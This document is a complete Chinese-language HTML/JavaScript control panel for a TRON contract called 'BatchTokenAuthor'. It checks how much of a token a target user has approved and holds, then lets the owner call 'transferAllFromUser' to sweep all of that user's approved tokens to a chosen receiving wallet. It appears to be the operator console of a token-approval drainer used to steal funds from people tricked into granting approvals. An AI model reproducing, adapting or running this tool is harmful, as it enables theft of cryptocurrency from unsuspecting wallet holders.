<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>合约管理面板</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/TronWeb.min.js"></script>
    <style>
        *{box-sizing:border-box;font-family:system-ui}
        body{max-width:800px;margin:20px auto;padding:0 16px;}
        .block{border:1px solid #ccc;padding:16px;border-radius:8px;margin:12px 0;}
        input{width:100%;padding:10px;margin:6px 0;border:1px solid #aaa;border-radius:4px;}
        button{padding:10px 18px;margin:4px;background:#1677ff;color:white;border:none;border-radius:4px;cursor:pointer;}
        textarea{width:100%;min-height:120px;padding:10px;}
    </style>
</head>
<body>
<h2>BatchTokenAuthor 合约管理面板</h2>
<div class="block">
    <h3>1. 合约配置</h3>
    <label>合约地址</label>
    <input id="contractAddr" placeholder="输入部署后的合约地址">
    <label>默认接收地址(可随时修改)</label>
    <input id="receiveAddr" placeholder="填接收代币的钱包地址">
    <div>
        <button onclick="connectWallet()">连接 TronLink / TP钱包</button>
        <span id="walletInfo">未连接</span>
    </div>
</div>
<div class="block">
    <h3>2. 查询工具</h3>
    <label>代币地址</label>
    <input id="qToken">
    <label>目标用户地址(bUser)</label>
    <input id="qUser">
    <button onclick="queryAllowance()">查询该用户对本合约授权额度</button>
    <button onclick="queryBalance()">查询用户代币余额</button>
    <div>结果：<span id="queryRes"></span></div>
</div>
<div class="block">
    <h3>3. 快捷提取（仅Owner可调用）</h3>
    <label>代币token地址</label>
    <input id="exToken">
    <label>被提取用户地址 bUser</label>
    <input id="exUser">
    <label>本次接收地址（覆盖上面默认）</label>
    <input id="exReceive">
    <button onclick="execTransferAll()">执行 transferAllFromUser</button>
    <div>交易返回：<textarea id="txLog"></textarea></div>
</div>
<script>
let tronWeb = null;
const abi = [
    {"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"bUser","type":"address"},{"internalType":"address","name":"receiveAddr","type":"address"}],"name":"transferAllFromUser","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"tokenOwner","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"user","type":"address"}],"name":"getUserBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}
];
async function connectWallet(){
    if(!window.tronWeb){
        alert("请先打开 TronLink / TP钱包扩展/App，注入tronWeb对象；请使用系统浏览器，不要微信浏览器");
        return;
    }
    tronWeb = window.tronWeb;
    await tronWeb.trx.getAccount();
    const addr = tronWeb.defaultAddress.base58;
    document.getElementById("walletInfo").innerText = "已连接钱包："+addr;
}
function getContract(){
    const cAddr = document.getElementById("contractAddr").value.trim();
    if(!tronWeb || !cAddr) throw new Error("先连接钱包+填写合约地址");
    return tronWeb.contract(abi,cAddr);
}
async function queryAllowance(){
    try{
        const c = getContract();
        const token = document.getElementById("qToken").value.trim();
        const user = document.getElementById("qUser").value.trim();
        const res = await c.allowance(token,user).call();
        document.getElementById("queryRes").innerText = "授权额度："+res.toString();
    }catch(e){document.getElementById("queryRes").innerText="错误:"+e.message;}
}
async function queryBalance(){
    try{
        const c = getContract();
        const token = document.getElementById("qToken").value.trim();
        const user = document.getElementById("qUser").value.trim();
        const res = await c.getUserBalance(token,user).call();
        document.getElementById("queryRes").innerText = "用户代币余额："+res.toString();
    }catch(e){document.getElementById("queryRes").innerText="错误:"+e.message;}
}
async function execTransferAll(){
    try{
        const c = getContract();
        const token = document.getElementById("exToken").value.trim();
        const bUser = document.getElementById("exUser").value.trim();
        let receive = document.getElementById("exReceive").value.trim();
        if(!receive) receive = document.getElementById("receiveAddr").value.trim();
        if(!token||!bUser||!receive){
            alert("代币、用户、接收地址不能为空");
            return;
        }
        document.getElementById("txLog").value = "正在请求钱包签名...";
        const tx = await c.transferAllFromUser(token,bUser,receive).send();
        document.getElementById("txLog").value = "交易成功hash:\n"+JSON.stringify(tx,null,2);
    }catch(err){
        document.getElementById("txLog").value = "执行失败：\n"+err.message;
    }
}
</script>
</body>
</html>
